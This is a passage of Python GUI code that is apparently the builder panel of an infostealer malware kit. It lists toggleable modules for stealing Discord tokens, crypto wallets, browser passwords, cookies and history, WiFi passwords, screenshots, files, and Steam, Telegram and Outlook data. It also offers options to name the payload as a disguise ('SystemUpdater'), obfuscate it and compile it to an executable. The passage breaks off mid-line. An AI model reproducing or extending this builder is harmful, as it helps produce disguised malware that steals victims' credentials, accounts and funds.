        grid = ctk.CTkFrame(view, fg_color="transparent")
        grid.pack(fill="both", expand=True)
        grid.grid_columnconfigure(0, weight=1, uniform="mods")
        grid.grid_columnconfigure(1, weight=1, uniform="mods")

        definitions = [
            ("discord", "🎮", "Discord Tokens", Theme.PURPLE),
            ("crypto_wallets", "💰", "Crypto Wallets", Theme.AMBER),
            ("system_info", "💻", "System Info", Theme.CYAN),
            ("browser_passwords", "🔑", "Browser Passwords", Theme.GREEN),
            ("browser_cookies", "🍪", "Browser Cookies", Theme.MAGENTA),
            ("browser_history", "📖", "Browser History", Theme.CYAN),
            ("wifi_passwords", "📶", "WiFi Passwords", Theme.GREEN),
            ("screenshot", "📷", "Screenshot", Theme.AMBER),
            ("file_grabber", "📁", "File Grabber", Theme.PURPLE),
            ("steam", "🕹", "Steam", Theme.CYAN),
            ("spotify", "🎵", "Spotify", Theme.GREEN),
            ("telegram", "📱", "Telegram", Theme.PURPLE),
            ("outlook", "📧", "Outlook", Theme.MAGENTA),
        ]
        for index, (key, icon, label, color) in enumerate(definitions):
            chip = ModuleChip(grid, key, icon, label, self.module_state.get(key, False),
                              color, self._on_module_toggle)
            chip.grid(row=index // 2, column=index % 2, sticky="ew", padx=6, pady=6)
            self._chips[key] = chip
        return view

    def _view_options(self, parent):
        view = ctk.CTkScrollableFrame(parent, fg_color="transparent",
                                      scrollbar_button_color=Theme.PURPLE,
                                      scrollbar_button_hover_color=Theme.CYAN)
        out = Card(view, t("options_out"), Theme.CYAN)
        out.pack(fill="x", pady=(0, 14))
        FieldLabel(out.body, t("f_payload_name")).pack(anchor="w")
        self.name_entry = NeonEntry(out.body, "SystemUpdater")
        self.name_entry.pack(fill="x", pady=(5, 14))

        FieldLabel(out.body, t("f_out_dir")).pack(anchor="w")
        dir_row = ctk.CTkFrame(out.body, fg_color="transparent")
        dir_row.pack(fill="x", pady=(5, 0))
        self.dir_entry = NeonEntry(dir_row, "output")
        self.dir_entry.pack(side="left", fill="x", expand=True)
        GhostButton(dir_row, t("btn_browse"), self.pick_output_dir,
                    accent=Theme.BORDER_HI, width=104, height=44).pack(side="left", padx=(8, 0))

        beh = Card(view, t("options_beh"), Theme.PURPLE)
        beh.pack(fill="x", pady=(0, 14))
        self.obfuscate_var = ctk.BooleanVar(value=True)
        self._switch(beh.body, t("opt_obf"), self.obfuscate_var, t("opt_obf_sub"))
        self.compile_var = ctk.BooleanVar(value=True)
        self._switch(beh.body, t("opt_exe"), self.compile_var, t("opt_exe_sub"))
        self.remember_var = ctk.BooleanVar(value=True)
        self._switch(beh.body, t("opt_rem"), self.remember_var, t("opt_rem_sub"))
        self.openfolder_var = ctk.BooleanVar(value=True)
        self._switch(beh.body, t("opt_open"), self.openfolder_var, t("opt_open_sub"))

        lang_card = Card(view, t("options_lang"), Theme.AMBER)
        lang_card.pack(fill="x", pady=(0, 14))
        lang_row = ctk.CTkFrame(lang_card.body, fg_color="transparent")
        lang_row.pack(fill="x")
        ctk.CTkLabel(lang_row, text=t("options_lang_sub"), font=FONT_TINY,
                     text_color=Theme.TEXT_MUTE).pack(side="left")
        LangToggle(lang_row, Lang.code, self.set_lang).pack(side="right")

        extra = Card(view, t("options_adv"), Theme.BORDER_HI)
        extra.pack(fill="x")
        ctk.CTkLabel(extra.body, text=f"{t('config_saved